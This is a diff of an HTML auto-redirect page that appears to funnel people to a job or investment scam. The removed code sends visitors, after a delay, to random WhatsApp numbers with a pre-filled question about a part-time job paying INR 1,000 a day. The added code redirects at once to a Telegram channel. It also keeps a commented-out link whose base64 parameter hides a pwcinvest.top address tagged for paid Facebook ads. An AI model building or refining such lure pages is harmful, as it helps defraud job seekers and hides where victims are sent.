@@ -4,50 +4,19 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Auto Redirect</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background: linear-gradient(to right, #00c6ff, #0072ff);
-            text-align: center;
-            padding: 50px;
-            color: white;
-        }
-        .container {
-            background: rgba(255, 255, 255, 0.9);
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
-            max-width: 400px;
-            margin: auto;
-            color: black;
-        }
-    </style>
+    <script type="text/javascript">
+        // Redirect immediately when the page loads
+       window.onload = function() {
+           // window.location.href = "https://elegant-froyo-05a4b3.netlify.app/redirect.html?data=aHR0cDovL3B3Y2ludmVzdC50b3Avd29yaz91dG1fbWVkaXVtPXBhaWQmdXRtX3NvdXJjZT1mYiZ1dG1faWQ9MTIwMjE3MDY3MDYwODQwNzczJnV0bV9jb250ZW50PTEyMDIxNzA2NzA4ODk5MDc3MyZ1dG1fdGVybT0xMjAyMTcwNjcwODkwMTA3NzMmdXRtX2NhbXBhaWduPTEyMDIxNzA2NzA2MDg0MDc3Mw=="; // Change this to the link you want
+         
+          window.location.href = "https://t.me/visalearning";
+       
+       };
+
+         
+    </script>
 </head>
 <body>
-
-    <div class="container">
-        <h1>Welcome!</h1>
-        <p>Please wait while we redirect you...</p>
-    </div>
-
-    <script>
-        const whatsappNumbers = [
-            "854380959", "7762035956", "7745943790", "7800434482",
-            "8604780225", "9771096501", 
-            
-        ];
-
-        function getRandomNumber() {
-            return whatsappNumbers[Math.floor(Math.random() * whatsappNumbers.length)];
-        }
-
-        setTimeout(function() {
-            let randomNumber = getRandomNumber();
-            let message = encodeURIComponent("Can you tell me the process of this part time job which earns INR 1,000 per day?");
-            window.location.href = "https://wa.me/91" + randomNumber + "?text=" + message;
-        }, 3000); // 3 सेकंड बाद रीडायरेक्ट होगा
-
-    </script>
-
+    <!-- No content in the body -->
 </body>
 </html>
